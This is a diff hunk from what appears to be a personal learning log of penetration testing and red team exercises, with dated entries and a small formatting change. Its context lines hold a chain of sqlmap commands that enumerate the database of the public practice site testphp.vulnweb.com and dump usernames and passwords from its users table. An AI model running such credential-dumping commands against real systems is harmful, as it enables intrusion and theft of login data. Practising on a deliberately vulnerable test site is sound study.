@@ -48,9 +48,7 @@ Penetration Tests and Red Team Exercises<br>
 <7 September><br>
 <8 September> sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -dbs | sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart --tables | sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users --columns | sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C uname --dump
 sqlmap -u http://testphp.vulnweb.com/artists.php?artist=2 -D acuart -T users -C pass --dump  [vulweb using sqlmap]<br>
-
-
-*--<9-10 September> 
+<9-10 September> <br>
 ----------------------------------------------------<br>
 --------------------------Week-4--------------------------<br>
 <11 September> Doccumntation on What is Syn and SEIM.<br>
